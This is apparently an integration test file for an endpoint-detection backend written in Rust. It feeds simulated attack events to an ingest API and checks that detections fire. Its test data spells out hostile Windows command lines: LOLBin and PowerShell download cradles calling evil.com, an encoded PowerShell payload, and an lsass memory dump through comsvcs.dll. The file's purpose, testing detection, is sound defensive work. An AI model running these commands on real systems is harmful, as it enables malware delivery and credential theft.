use std::sync::Arc;

use axum::{
    Router,
    body::Body,
    http::{self, Request, StatusCode},
};
use serde_json::json;
use tower::ServiceExt;

use monolith_backend::config::{
    AppConfig, AuthConfig, NotificationsConfig, RateLimitingConfig, ResponseRulesConfig,
    ServerConfig,
};
use monolith_backend::router::build_router;
use monolith_backend::server::AppState;
use monolith_shared::config::{DatabaseConfig, DatabaseKind, LoggingConfig, TlsConfig};
use monolith_shared::crypto::JwtManager;
use monolith_shared::db::{
    Database, DatabaseConnection, DbParam, MigrationManager, SqliteDatabase,
};

async fn seed_endpoint(conn: &dyn DatabaseConnection, id: &str) {
    conn.execute(
        "INSERT OR IGNORE INTO endpoints (id, hostname, ip_address, os_version, os_architecture, agent_version) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
        &[
            DbParam::Text(id.into()),
            DbParam::Text(id.into()),
            DbParam::Text("192.168.1.10".into()),
            DbParam::Text("Windows 10 Pro".into()),
            DbParam::Text("x64".into()),
            DbParam::Text("1.0.0".into()),
        ],
    ).await.unwrap();
}

fn build_req(method: http::Method, path: &str, body: Option<&str>, token: &str) -> Request<Body> {
    let builder = Request::builder()
        .method(method)
        .uri(path)
        .header("Authorization", format!("Bearer {}", token));
    if let Some(b) = body {
        let req = builder
            .header("Content-Type", "application/json")
            .body(Body::from(b.to_string()))
            .unwrap();
        return req;
    }
    builder.body(Body::empty()).unwrap()
}

async fn setup_app() -> (Router, String) {
    let dir = tempfile::TempDir::new().unwrap();
    let db_path = dir.path().join("test_malicious.db");

    let config = AppConfig {
        server: ServerConfig {
            host: "127.0.0.1".into(),
            port: 0,
            grpc_port: 0,
        },
        tls: TlsConfig {
            cert_path: "test-cert.pem".into(),
            key_path: "test-key.pem".into(),
            ca_cert_path: "test-ca.pem".into(),
        },
        database: DatabaseConfig {
            kind: DatabaseKind::Sqlite,
            path: db_path.to_str().unwrap().to_string(),
            max_connections: 1,
        },
        logging: LoggingConfig::default(),
        rate_limiting: RateLimitingConfig {
            enabled: false,
            ..Default::default()
        },
        response_rules: ResponseRulesConfig {
            enabled: false,
            ..Default::default()
        },
        notifications: NotificationsConfig::default(),
        auth: AuthConfig {
            jwt_secret: "test-secret-key-at-least-32-characters-long!".into(),
            jwt_expiration_secs: 3600,
            refresh_expiration_secs: 86400,
            argon2_memory_cost: 19456,
            argon2_time_cost: 2,
            argon2_parallelism: 1,
            jwt_private_key_path: None,
            jwt_public_key_path: None,
        },
    };
    let db = SqliteDatabase::new(db_path.to_str().unwrap());
    let conn = db.connect(&config.database).await.unwrap();
    MigrationManager::new().run(&conn).await.unwrap();

    seed_endpoint(&conn, "win10-pc-01").await;
    seed_endpoint(&conn, "victim-pc").await;

    let state = Arc::new(AppState::new(config.clone(), Box::new(conn)));
    let app = build_router(state.clone());
    let jwt = JwtManager::new(config.auth.jwt_secret.as_bytes(), 3600, 86400);
    let token = jwt
        .issue_token("test-user-id", "admin", "administrator")
        .unwrap();
    let token_hash = monolith_shared::crypto::hash_token(&token);

    // Insert test user first to satisfy FOREIGN KEY constraint
    state
        .db
        .execute(
            "INSERT INTO users (id, username, password_hash, email, role, enabled)
         VALUES (?1, ?2, ?3, ?4, ?5, 1)",
            &[
                monolith_shared::db::DbParam::Text("test-user-id".to_string()),
                monolith_shared::db::DbParam::Text("admin".to_string()),
                monolith_shared::db::DbParam::Text("dummy-hash".to_string()),
                monolith_shared::db::DbParam::Text("admin@example.com".to_string()),
                monolith_shared::db::DbParam::Text("administrator".to_string()),
            ],
        )
        .await
        .unwrap();

    // Save token to sessions table to bypass revocation check
    state
        .db
        .execute(
            "INSERT INTO sessions (id, user_id, token, token_hash, refresh_token, expires_at)
         VALUES (?1, ?2, ?3, ?4, ?5, datetime('now', '+1 day'))",
            &[
                monolith_shared::db::DbParam::Text(uuid::Uuid::new_v4().to_string()),
                monolith_shared::db::DbParam::Text("test-user-id".to_string()),
                monolith_shared::db::DbParam::Text(token.clone()),
                monolith_shared::db::DbParam::Text(token_hash),
                monolith_shared::db::DbParam::Text("dummy-refresh-token".to_string()),
            ],
        )
        .await
        .unwrap();

    (app, token)
}

async fn ingest_event(
    app: &Router,
    token: &str,
    endpoint_id: &str,
    event_type: &str,
    data: serde_json::Value,
) -> serde_json::Value {
    let resp = app
        .clone()
        .oneshot(build_req(
            http::Method::POST,
            "/api/v1/events/ingest",
            Some(
                &json!({
                    "endpoint_id": endpoint_id,
                    "event_type": event_type,
                    "data": data,
                })
                .to_string(),
            ),
            token,
        ))
        .await
        .unwrap();
    let status = resp.status();
    let body = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
        .await
        .unwrap();
    assert_eq!(
        status,
        StatusCode::OK,
        "event ingest failed (status={}): {}",
        status,
        String::from_utf8_lossy(&body)
    );
    serde_json::from_slice(&body).unwrap()
}

#[tokio::test]
async fn test_lolbin_execution_detected() {
    let (app, token) = setup_app().await;
    let result = ingest_event(&app, &token, "win10-pc-01", "process_create", json!({
        "pid": 1234,
        "image_path": "C:\\Windows\\System32\\rundll32.exe",
        "command_line": "rundll32.exe -e urlcache.dll,URLCacheDownload http://evil.com/payload.exe",
        "username": "user"
    })).await;
    assert!(result["accepted"].as_bool().unwrap_or(false));
    assert!(
        result["detections"].as_u64().unwrap_or(0) > 0,
        "LOLBin should trigger detection"
    );
}

#[tokio::test]
async fn test_powershell_encoded_command_detected() {
    let (app, token) = setup_app().await;
    let result = ingest_event(&app, &token, "win10-pc-01", "process_create", json!({
        "pid": 5678,
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAYwBvAG4ALgBlAHYAaQBsAC4AYwBvAG0ALwBwAHMAJwApAA==",
        "username": "user"
    })).await;
    assert!(result["accepted"].as_bool().unwrap_or(false));
    assert!(
        result["detections"].as_u64().unwrap_or(0) > 0,
        "Base64 PowerShell should trigger detection"
    );
}

#[tokio::test]
async fn test_registry_persistence_detected() {
    let (app, token) = setup_app().await;
    // Use scheduled_task event which the persistence detector matches
    let result = ingest_event(&app, &token, "win10-pc-01", "scheduled_task", json!({
        "operation": "create",
        "task_name": "WindowsUpdate",
        "task_command": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABO...",
        "username": "user",
        "pid": 5678,
        "image_path": "C:\\Users\\user\\malware.exe"
    })).await;
    assert!(result["accepted"].as_bool().unwrap_or(false));
    assert!(
        result["detections"].as_u64().unwrap_or(0) > 0,
        "Scheduled task should trigger persistence detection"
    );
}

#[tokio::test]
async fn test_credential_dumping_correlated() {
    let (app, token) = setup_app().await;
    // Event with comsvcs.dll mini dump triggers credential dumping detection
    let result = ingest_event(&app, &token, "win10-pc-01", "process_create", json!({
        "pid": 8888,
        "image_path": "C:\\Windows\\System32\\rundll32.exe",
        "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\temp\\lsass.dmp full",
        "username": "user"
    })).await;
    assert!(result["accepted"].as_bool().unwrap_or(false));
    assert!(
        result["detections"].as_u64().unwrap_or(0) > 0,
        "Credential dumping should trigger detection"
    );
}

#[tokio::test]
async fn test_brute_force_correlation() {
    let (app, token) = setup_app().await;
    for i in 0..15 {
        ingest_event(
            &app,
            &token,
            "win10-pc-01",
            "user_logon",
            json!({
                "username": "administrator",
                "source_ip": "10.0.0.50",
                "pid": 0,
                "image_path": "C:\\Windows\\System32\\svchost.exe",
                "logon_type": "network",
                "result": "failure",
                "timestamp": format!("2026-07-02T12:{:02}:00Z", i * 2)
            }),
        )
        .await;
    }
    // Verify alerts were created
    let resp = app
        .clone()
        .oneshot(build_req(http::Method::GET, "/api/v1/alerts", None, &token))
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = axum::body::to_bytes(resp.into_body(), 1024 * 1024)
        .await
        .unwrap();
    let alerts: serde_json::Value = serde_json::from_slice(&body).unwrap();
    let alert_count = alerts["alerts"].as_array().map(|a| a.len()).unwrap_or(0);
    assert!(
        alert_count > 0,
        "brute force should create alerts, got {}",
        alert_count
    );
}

#[tokio::test]
async fn test_masquerading_detected() {
    let (app, token) = setup_app().await;
    let result = ingest_event(&app, &token, "win10-pc-01", "process_create", json!({
        "pid": 9999,
        "image_path": "C:\\Users\\user\\AppData\\Local\\Temp\\powershell.exe",
        "name": "powershell.exe",
        "command_line": "C:\\Users\\user\\AppData\\Local\\Temp\\powershell.exe -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps')",
        "username": "user"
    })).await;
    assert!(result["accepted"].as_bool().unwrap_or(false));
    assert!(
        result["detections"].as_u64().unwrap_or(0) > 0,
        "Masquerading should trigger detection"
    );
}

#[tokio::test]
async fn test_multiple_attack_patterns_detected() {
    let (app, token) = setup_app().await;

    let attack_events = vec![
        json!({"pid": 1001, "image_path": "C:\\Windows\\System32\\rundll32.exe", "command_line": "rundll32.exe -e urlcache.dll,URLCacheDownload http://evil.com/payload.exe", "username": "user"}),
        json!({"pid": 1002, "image_path": "C:\\Windows\\System32\\regsvr32.exe", "command_line": "regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll", "username": "user"}),
        json!({"pid": 1003, "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAYwBvAG4ALgBlAHYAaQBsAC4AYwBvAG0ALwBwAHMAJwApAA==", "username": "user"}),
        json!({"pid": 1004, "image_path": "C:\\Windows\\System32\\cmd.exe", "command_line": "cmd.exe /c whoami /all", "username": "user"}),
        json!({"pid": 1005, "image_path": "C:\\Users\\user\\AppData\\Local\\Temp\\powershell.exe", "name": "powershell.exe", "command_line": "C:\\Users\\user\\AppData\\Local\\Temp\\powershell.exe -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps')", "username": "user"}),
    ];

    let mut detection_count = 0usize;
    for event in &attack_events {
        let result = app.clone().oneshot(
            build_req(http::Method::POST, "/api/v1/events/ingest", Some(
                &json!({"endpoint_id": "victim-pc", "event_type": "process_create", "data": event}).to_string()
            ), &token),
        ).await.unwrap();
        let body = axum::body::to_bytes(result.into_body(), 1024 * 1024)
            .await
            .unwrap();
        let parsed: serde_json::Value = serde_json::from_slice(&body).unwrap();
        detection_count += parsed["detections"].as_u64().unwrap_or(0) as usize;
    }

    assert!(
        detection_count > 0,
        "expected at least 1 detection across all attack events, got {}",
        detection_count
    );

    // Verify events endpoint works
    let resp = app
        .clone()
        .oneshot(build_req(http::Method::GET, "/api/v1/events", None, &token))
        .await
        .unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_allowlist_matching() {
    let (app, token) = setup_app().await;

    // 1. Add allowlist rule via API
    let allow_res = app
        .clone()
        .oneshot(build_req(
            http::Method::POST,
            "/api/v1/allowlist",
            Some(
                &json!({
                    "rule_type": "process_path",
                    "value": "c:\\program files\\it-support\\anydesk.exe",
                    "description": "IT Support Tool"
                })
                .to_string(),
            ),
            &token,
        ))
        .await
        .unwrap();
    assert_eq!(allow_res.status(), StatusCode::OK);

    // 2. Ingest event matching the allowlist rule
    let event_res = ingest_event(
        &app,
        &token,
        "win10-pc-01",
        "process_create",
        json!({
            "pid": 9999,
            "image_path": "C:\\Program Files\\IT-Support\\anydesk.exe",
            "name": "anydesk.exe",
            "command_line": "\"C:\\Program Files\\IT-Support\\anydesk.exe\"",
            "username": "user"
        }),
    )
    .await;

    assert!(event_res["accepted"].as_bool().unwrap_or(false));
    assert_eq!(
        event_res["detections"].as_u64().unwrap_or(0),
        0,
        "Allowlisted process should trigger 0 detections"
    );
}
